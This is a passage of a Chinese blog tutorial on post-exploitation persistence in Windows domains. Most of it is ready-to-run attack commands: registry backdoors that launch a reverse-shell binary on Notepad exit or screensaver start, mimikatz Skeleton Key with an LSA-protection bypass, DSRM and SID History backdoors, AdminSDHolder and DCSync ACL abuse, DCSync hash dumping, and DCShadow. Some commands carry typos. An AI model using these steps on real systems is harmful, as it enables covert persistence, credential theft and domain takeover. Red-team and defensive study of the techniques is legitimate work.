+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">启用对记事本进程的静默推出监视</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line">启用Windows错误报告进程WarFault.exe，它将成为reverse_tcp.exe的父进程</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line">将监视器设为reverse_tcp.exe</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Winodws\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>这样用户打开记事本之后正常运行，但是关闭记事本时将在WerFault.exe进程中创建子进程以运行后门程序reverse_tcp.exe</p>
+<h4 id="利用屏幕保护程序"><a href="#利用屏幕保护程序" class="headerlink" title="利用屏幕保护程序"></a>利用屏幕保护程序</h4><p>屏幕保护时Windows的一种功能，保护程序具有.scr扩展文件名组成的可执行文件</p>
+<p>位于HKEY_CURRENT_USER\Control Panel\Desktop</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324084138795.png"
+                      alt="image-20230324084138795"
+                ></p>
+<p>我们就可以通过编辑注册表，修改scrnsave.exe的键的值，即修改路径</p>
+<p>实现触发屏幕保护程序，实现后门触发</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">将触发屏幕保护程序时执行的程序自定义为恶意程序，这里可以以.scr或.exe结尾的都可以</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Users\Marcus reverse_tcp.scr&quot;</span><br><span class="line">启用屏幕保护</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1</span><br><span class="line">设置不需要密码</span><br><span class="line">reg add &quot;HKEY_CURRENT_USERControl Panel\Desktop&quot; /v ScreenSaverIsSecure /t REG_SZ /d &quot;0&quot;</span><br><span class="line">将用户不活动的超时设为60秒</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER Control Panel、Desktop&quot; /v ScreenSaveTime0ut /t REG_SZ /d &quot;60&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个不需要管理员权限，普通用户即可</p>
+<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>DLL劫持的原理是将同名的恶意DLL文件放在合法的DLL文件所在路径的搜索位置中，当应用程序搜索DLL时，就会用恶意DLL代替合法的DLL来加载。需要管理员权限</p>
+<h6 id="1-劫持应用程序"><a href="#1-劫持应用程序" class="headerlink" title="1.劫持应用程序"></a>1.劫持应用程序</h6><h2 id="常见的域后门技术"><a href="#常见的域后门技术" class="headerlink" title="常见的域后门技术"></a>常见的域后门技术</h2><h3 id="创建Skeleton-Key域后门"><a href="#创建Skeleton-Key域后门" class="headerlink" title="创建Skeleton Key域后门"></a>创建Skeleton Key域后门</h3><p>Skeleton Key即万能钥匙，在域控安装这个东西所有的账户都可以用同一个密码，同时原有密码依然有效，但是重启域控之后就失效了</p>
+<h6 id="1-常规利用"><a href="#1-常规利用" class="headerlink" title="1.常规利用"></a>1.常规利用</h6><p>通过mimikatz执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p>就可以创建一个Skeleton Key域后门密码为mimikatz</p>
+<h6 id="2-缓解措施"><a href="#2-缓解措施" class="headerlink" title="2.缓解措施"></a>2.缓解措施</h6><p>微软对于这个问题在2014年3月添加了一个LSA保护策略，可以执行命令开启关闭LSA</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\lSA&quot; /V RunAsPPL /T REG_DWORD /d 1 /f</span><br><span class="line">关闭</span><br><span class="line">reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL</span><br></pre></td></tr></table></figure></div>
+
+<p>开启后，mimikatz就会失效，都无法安装SkeletonKey</p>
+<p>但是！！</p>
+<p>早在2013年10月mimikatz就支持绕过LSA保护。该功能需要mimikatz中的mimidrv.sys文件，命令为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">           !+</span><br><span class="line">           !processprotect /process:lsass.exe /remove</span><br><span class="line">           misc::sekleton</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324220115568.png"
+                      alt="image-20230324220115568"
+                ></p>
+<h3 id="创建DSRM域后门"><a href="#创建DSRM域后门" class="headerlink" title="创建DSRM域后门"></a>创建DSRM域后门</h3><p>DSRM时域中的一中安全模式，用于使服务器脱机，进行紧急维护使用，可以后期来修复、还原或重建活动目录数据库</p>
+<p>DSRM修改密码指令（NTDSUtil）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">进入NTDSUtil</span><br><span class="line">ntdsutil</span><br><span class="line">进入设置DSRM账户密码设置模式</span><br><span class="line">set dsrm password</span><br><span class="line">在当前的域控制器上恢复DSRM密码</span><br><span class="line">reset passwrod on server null</span><br><span class="line">输入新密码</span><br><span class="line">再次输入密码</span><br><span class="line">退出</span><br><span class="line">q</span><br><span class="line">退出ntdsutil</span><br><span class="line">q</span><br></pre></td></tr></table></figure></div>
+
+<p>注意：仅支持win server 2008以上且需要管理员权限</p>
+<p>1.执行</p>
+<p><code>mimikatz.exe &quot;privilege::Debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</code></p>
+<p>读取SAM中的DSRM账户的哈希值</p>
+<p>2.更改登录模式</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有以下三种模式</span><br><span class="line">0：只有在域控重启并进入DSRM模式时，才可以使用DSRM管理员账号</span><br><span class="line">1：只有在本地AD、DS停止服务的时候才可以使用DARM账号</span><br><span class="line">2：任何情况下都可以使用DSRM账号</span><br></pre></td></tr></table></figure></div>
+
+<p>执行</p>
+<p><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f</code></p>
+<p>将模式改为2，允许任何情况下都可以使用DSRM账户</p>
+<p>3.kali执行 python3 psexec.py DC-1&#x2F;<a class="link"   href="mailto:&#x41;&#100;&#x6d;&#x69;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#49;&#49;" >&#x41;&#100;&#x6d;&#x69;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#49;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -hashes:cb136a448767792bae25563a498a86e6</p>
+<p>即可连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325140257148.png"
+                      alt="image-20230325140257148"
+                ></p>
+<h3 id="SID-History的利用"><a href="#SID-History的利用" class="headerlink" title="SID History的利用"></a>SID History的利用</h3><p>在Windows中，SID是指安全标识符，是用户、用户组或其他安全主题的唯一、不可变的标识符</p>
+<p>Windows根据ACL也就是访问控制列表授予或拒绝对资源的访问和特权，ACL使用SID来识别用户身份</p>
+<p>如果一个账户被删除，重新建立一个相同名字的账户，其权限不会是前一个账户的权限，因为SID是不一样的</p>
+<p>SID History是一个支持域迁移方案的属性，使得账户的访问权限能有效克隆，原理就是克隆SID</p>
+<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以将域管理员的SID添加到其他域用户的SID History属性中，以此建立一个隐藏的域后门，需要域管理员权限</p>
+<p>1.创建一个nihao用户进行演示</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325144331155.png"
+                      alt="image-20230325144331155"
+                ></p>
+<p>2.上传mimikatz执行命令，并且将域管理员的SID添加到Hacker的SID History属性中</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz&gt;2.1.0</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam:nihao /new:Administrator&quot; exit</span><br><span class="line">&lt;2.1.0</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc:addsid Hacker ADSAdministrator&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p>3.通过powerhell查看nihao用户的属性</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser nihao -Properties SIDHistory</span><br></pre></td></tr></table></figure></div>
+
+<p>发现SID History属性值已经和域管理员账户的SID相同，说明已经继承了域管理员的权限</p>
+<p>4.通过nihao用户连接</p>
+<p>kali      python3 wmiexec.py HACK-MY&#x2F;nihao:nihao\Admin!@#<a class="link"   href="mailto:&#52;&#x35;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#56;&#49;&#x2e;&#49;&#x34;&#x30;" >&#52;&#x35;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#56;&#49;&#x2e;&#49;&#x34;&#x30; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="利用AdminSDHolder打造域后门"><a href="#利用AdminSDHolder打造域后门" class="headerlink" title="利用AdminSDHolder打造域后门"></a>利用AdminSDHolder打造域后门</h3><p>AdminSDHolder是一个特殊的AD容器对象，位于Domain NC的system容器下</p>
+<p>一般作为某些受保护对象的安全模板，防止这些对象遭受恶意的修改或者滥用</p>
+<p>受保护对象通常包括特权用户和受保护的组，Administrator、Domain Admins、Enterprise Admin以及Schema Admins等</p>
+<p>在活动目录中用adminCount用来标记特权用户和组，通常特权用户和组属性被设为1</p>
+<p>通过AdFind查询adminCount属性设置为1的对象，可以找到所有受AdminSDHolder保护的特权和组</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列举受保护的用户</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot; -dn</span><br><span class="line">列举搜保护的组</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn</span><br></pre></td></tr></table></figure></div>
+
+<p>默认下，系统会定期检查（60分钟）受保护对象的安全描述符，将受保护对的ACL和AdminSDHolder的ACL相比较，如果不一致将会强制修改为AdminSDHolder的ACL（通过SDProp进程来完成检查）</p>
+<h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以篡改AdminADHolder的ACL配置，然后60分钟后SDPorp调用将会强制改变受保护对象的ACL，以此建立一个隐蔽的后门，需要域管理员权限</p>
+<p>执行命令，通过powerView向AdminSDHolder容器添加一个ACL，使普通的域用户拥有对AdminSDHolder的完全控制权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<p>等60分钟让SDProp生效，也可以用指令使其时间缩短，这个时候Marcus用户就可以向Domain Admins等关键用户组成员添加成员</p>
+<p>清除这个权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p>PasswordChangeNotify这个东西是windows中为了重置密码，windows会检查新密码的复杂性是否够安全，如果符合要求LSA就会调用它在系统中同步密码</p>
+<p>调用的过程中密码是明文传输，所以可以利用KOOK技术在调用过程中劫持密码</p>
+<h2 id="DCSync技术"><a href="#DCSync技术" class="headerlink" title="DCSync技术"></a>DCSync技术</h2><h3 id="利用DCSync导出域内hash"><a href="#利用DCSync导出域内hash" class="headerlink" title="利用DCSync导出域内hash"></a>利用DCSync导出域内hash</h3><p>在一个域环境中可以有多台域控，每台域控各自存储着一份所在域的活动目录的可写副本</p>
+<p>对目录的任何修改都可以从源域控中同步到其他域控中</p>
+<p>当一个域控想从其他域控获取数据时，客户端域控会向服务端域控获取DSGetNCChanges请求，这个请求的响应包含着更新</p>
+<p>一般15分钟会有一次域同步</p>
+<p>DCSync就是利用域控同步原理，通过Directory Replication Service服务的IDL——DRSGetNCChanges接口向域控发起请求</p>
+<p>可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控的数据</p>
+<p>注意：此攻击并不适用于只读域控（RODC）</p>
+<h4 id="mimikatz下的利用"><a href="#mimikatz下的利用" class="headerlink" title="mimikatz下的利用"></a>mimikatz下的利用</h4><p>mimikatz在2015年8月更新中添加了DCSync功能</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">导出域内指定用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hack-my\administrator&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325162902673.png"
+                      alt="image-20230325162902673"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">导出域内所有用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163104824.png"
+                      alt="image-20230325163104824"
+                ></p>
+<p><code>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163210977.png"
+                      alt="image-20230325163210977"
+                ></p>
+<h4 id="Impacket下的利用"><a href="#Impacket下的利用" class="headerlink" title="Impacket下的利用"></a>Impacket下的利用</h4><p>Impacket中的secretsdump.py可以支持DCSync技术导出域控中的用户哈希</p>
+<p>该工具可以使用高权限用户的密码来实现从域外主机读取域内主机的hash值，同时可以通过Dcsync或卷影复制的方法，NTDS.dit的中导出所有用户的hash值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py hack-my.com/administrator(账号):Admin!@#45(密码)@192.168.81.140(域控IP) -just-dc-user &quot;hack-my\administrator&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>导出域管理员Administrator用户的hash值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325165120864.png"
+                      alt="image-20230325165120864"
+                ></p>
+<h3 id="利用DCSync维持域内权限"><a href="#利用DCSync维持域内权限" class="headerlink" title="利用DCSync维持域内权限"></a>利用DCSync维持域内权限</h3><p>在获取域管理员权限之后，可以手动为域内标准用户赋予DCSync操作权限，从而实现隐蔽发域后门</p>
+<p>通过powershell中的PowerView.ps1脚本实现</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">为域用户Alice添加DCSync权限</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure></div>
+
+<p>添加成功后可以通过Alice用户导出域内用户的哈希</p>
+<p><code>python3 secretsdump.py hack-my.com/administrator:Admin\!\@\#45@192.168.81.141 -just-dc-user &quot;hack-my\administrator&quot;</code></p>
+<p>清除权限</p>
+<p><code>Remove-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</code></p>
+<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow技术同样利用了域控之间的DRS数据同步</p>
+<p>但是它与DCSync思路相反</p>
+<p>它是利用创建一个恶意的域控，利用域控之间的同步复制，将预先设定的对象和对象属性注入正在运行的合法域控中，以此来创建域后门等</p>
+<p>通过DCShadow修改普通域用户Alice来演示攻击原理</p>
+<p>前文已经知道，将用户的primaryGroupID改为512，可以然用户成为域管理员</p>
+<p>RID是指相对标识符，时SID的一部分，通常在SID字符串的末端。</p>
+<p>windows使用SID来区分用户账户和组的</p>
+<h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>1.在任意注意中运行mimkatz并执行以下命令，创建恶意域控</p>
+<p><code>mimikatz.exe &quot;lsadump::dcshadow /object:CN=Alice,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit</code></p>
+<p>2.第一个命令窗口不要关，重新打开一个，强制触发域复制，将数据更改推送至合法域控制器</p>
+<p><code>mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325173750046.png"
+                      alt="image-20230325173750046"
+                ></p>
+<p> 按理来说这时候Alice已经是域管理员组的用户了，但不知道为啥我成功不了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325175329381.png"
+                      alt="image-20230325175329381"
+                ></p>
+<p>DCShadow使得测试人员可以直接修改活动目录数据库中的对象</p>
+<p>域防护比较严的情况下，可以利用DCShadow操控SID History、Krbtgt账户的密码，或者将用户添加到特权组，实现域权限持久化</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 内网权限持久化</li>
+        <li><strong>Author:</strong> yuBetter</li>
+        <li><strong>Created at:</strong> 2023-05-15 09:30:48</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-05-15 09:31:57
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yubetter.github.io/2023/05/15/内网权限持久化/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/05/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">文件上传绕过之靶场实战</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/05/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">数据库提权</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+                <div class="comment-container">
+                    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-pjax>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">内网权限持久化</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF"><span class="nav-text">常见的系统后门技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="nav-text">创建影子账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-text">系统服务后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-text">计划任务后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9-x2F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%90%8E%E9%97%A8"><span class="nav-text">启动项&#x2F;注册表键后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-Monitors"><span class="nav-text">Port Monitors</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8B%E4%BB%B6%E8%A7%A6%E5%8F%91%E6%89%A7%E8%A1%8C"><span class="nav-text">事件触发执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%9F%9F%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF"><span class="nav-text">常见的域后门技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BASkeleton-Key%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="nav-text">创建Skeleton Key域后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BADSRM%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="nav-text">创建DSRM域后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SID-History%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">SID History的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8AdminSDHolder%E6%89%93%E9%80%A0%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="nav-text">利用AdminSDHolder打造域后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HOOK-PasswordChangeNotify"><span class="nav-text">HOOK PasswordChangeNotify</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCSync%E6%8A%80%E6%9C%AF"><span class="nav-text">DCSync技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DCSync%E5%AF%BC%E5%87%BA%E5%9F%9F%E5%86%85hash"><span class="nav-text">利用DCSync导出域内hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8DCSync%E7%BB%B4%E6%8C%81%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90"><span class="nav-text">利用DCSync维持域内权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DCShadow"><span class="nav-text">DCShadow</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
